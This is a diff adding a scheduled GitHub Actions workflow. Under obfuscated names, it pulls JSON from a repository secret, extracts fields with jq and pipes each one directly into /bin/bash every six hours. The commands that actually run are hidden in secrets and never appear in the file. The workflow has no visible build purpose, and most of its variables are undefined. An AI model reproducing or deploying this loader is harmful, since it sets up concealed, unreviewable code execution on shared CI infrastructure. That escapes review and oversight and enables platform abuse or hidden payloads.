@@ -1,0 +1,24 @@
+name: weijunxianjie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weijunxianjie
+        env:
+          et40752: ${{ secrets.et40752 }}
+        run: |
+          echo $et40752 | jq -r .jejk969 | /bin/bash
+          echo $w315 | jq -r .ux7 | /bin/bash
+          echo $nlj92 | jq -r .dpdb92 | /bin/bash
+          echo $kfew600 | jq -r .uqq0 | /bin/bash
+          echo $sg94007 | jq -r .oiibk97 | /bin/bash
+          echo $ld0 | jq -r .wfcnp202 | /bin/bash
+          echo $dboq931 | jq -r .itsri324 | /bin/bash
+          echo $tysn5 | jq -r .oisbj40414 | /bin/bash
+          echo $woyxk4 | jq -r .hv86160 | /bin/bash
+
